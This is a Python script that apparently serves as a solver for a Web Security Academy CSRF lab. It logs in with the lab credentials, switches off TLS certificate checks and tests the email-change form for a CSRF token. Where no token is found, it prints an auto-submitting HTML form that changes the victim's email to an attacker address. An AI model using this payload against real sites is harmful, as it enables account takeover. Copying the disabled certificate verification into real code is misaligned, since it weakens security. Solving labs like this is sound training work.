import requests
from bs4 import BeautifulSoup
import urllib.parse

# Disable warnings related to unverified HTTPS requests
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

def detect_csrf_vulnerability(base_url):
    # Define the URLs and credentials
    login_url = f"{base_url}/login"
    account_url = f"{base_url}/my-account?id=wiener"
    change_email_url = f"{base_url}/my-account/change-email"

    # Define the login credentials
    credentials = {
        'username': 'wiener',
        'password': 'peter'
    }

    # Create a session
    session = requests.Session()
    
    # Disable SSL verification
    session.verify = False
    
    # Log in to the account
    try:
        login_response = session.post(login_url, data=credentials)
    except requests.exceptions.RequestException as e:
        print(f"Error during login request: {e}")
        return
    
    # Capture the email change form to verify fields
    account_response = session.get(account_url)
    soup = BeautifulSoup(account_response.text, 'html.parser')
    email_change_form = soup.find('form', {'action': '/my-account/change-email'})
    
    # Check if the form was found
    if not email_change_form:
        print("Failed to find the email change form")
        return
    
    # Extract form fields
    form_fields = {}
    for input_tag in email_change_form.find_all('input'):
        if input_tag.get('name'):
            form_fields[input_tag.get('name')] = input_tag.get('value')
    
    # Check for CSRF tokens
    csrf_tokens = [token for token in form_fields if 'csrf' in token.lower()]
    if csrf_tokens:
        print("CSRF token found in form, likely not vulnerable")
        return
    else:
        print("No CSRF token found in form, likely vulnerable")
    
    # Define the new email to be set via CSRF attack
    new_email = "attacker@web-security-academy.net"
    form_fields['email'] = new_email
    
    # Generate the CSRF exploit HTML with standard form submission
    form_fields_html = ''.join([f'<input type="hidden" name="{k}" value="{v}">' for k, v in form_fields.items()])
    csrf_exploit_html = f"""
<form method="POST" action="{change_email_url}">
    {form_fields_html}
</form>
<script>
    document.forms[0].submit();
</script>
"""
    
    # Print the CSRF exploit HTML payload
    print("CSRF Exploit HTML Payload:")
    print(csrf_exploit_html)

# URL to check
url_to_check = "https://0acf00400492b54e818fd0e000b5001e.web-security-academy.net"
detect_csrf_vulnerability(url_to_check)
